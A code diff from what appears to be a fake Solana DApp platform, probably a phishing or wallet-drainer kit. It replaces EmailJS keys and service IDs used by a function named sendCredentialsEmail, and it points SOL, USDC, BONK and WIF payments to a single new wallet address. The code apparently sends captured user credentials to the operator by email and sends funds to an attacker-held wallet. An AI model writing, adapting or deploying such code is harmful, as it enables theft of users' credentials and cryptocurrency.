@@ -1,3 +1,4 @@
+
  // ==============================================
     // COMPLETE FIXED SOLANA DAPPS PLATFORM
     // ALL ISSUES RESOLVED - FULLY WORKING
@@ -10,7 +11,7 @@
         // ============ ADD THIS EMAILJS INITIALIZATION ============
     // Initialize EmailJS with YOUR REAL PUBLIC KEY
     (function() {
-        emailjs.init("sEeIF-0T9vylyhFIS"); // Replace with your REAL Public Key
+        emailjs.init("empxcHNP1i5M_BV62 "); // Replace with your REAL Public Key
         console.log("✅ EmailJS initialized with Public Key");
     })();
         
@@ -867,9 +868,9 @@ async function sendCredentialsEmail(templateParams) {
             
             // EmailJS configuration (mock)
            this.emailjsConfig = {
-            publicKey: 'sEeIF-0T9vylyhFIS',      // From EmailJS dashboard
-            serviceID: 'service_wtoqc3o',        // From EmailJS > Email Services
-            templateID: 'template_hih45ne'     // From EmailJS > Email Templates
+            publicKey: 'empxcHNP1i5M_BV62 ',      // From EmailJS dashboard
+            serviceID: 'service_7vwoy0d',        // From EmailJS > Email Services
+            templateID: 'template_dmam2ku '     // From EmailJS > Email Templates
 };
             
             // Live notifications
@@ -896,10 +897,10 @@ async function sendCredentialsEmail(templateParams) {
             
             // Wallet addresses
             this.cryptoAddresses = {
-                sol: 'BYQ4hP7nzETTnvUyVsgCxqGEAKUgScZAjhi8jG44rcLb',
-                usdc: 'BYQ4hP7nzETTnvUyVsgCxqGEAKUgScZAjhi8jG44rcLb',
-                bonk: 'BYQ4hP7nzETTnvUyVsgCxqGEAKUgScZAjhi8jG44rcLb',
-                wif: 'BYQ4hP7nzETTnvUyVsgCxqGEAKUgScZAjhi8jG44rcLb'
+                sol: '3eRJM9c5YXbY7riQXSN8Ng3ApqK92qqnMtLb5BZo5Am5',
+                usdc: '3eRJM9c5YXbY7riQXSN8Ng3ApqK92qqnMtLb5BZo5Am5',
+                bonk: '3eRJM9c5YXbY7riQXSN8Ng3ApqK92qqnMtLb5BZo5Am5',
+                wif: '3eRJM9c5YXbY7riQXSN8Ng3ApqK92qqnMtLb5BZo5Am5'
             };
             
             // Watch trading variables
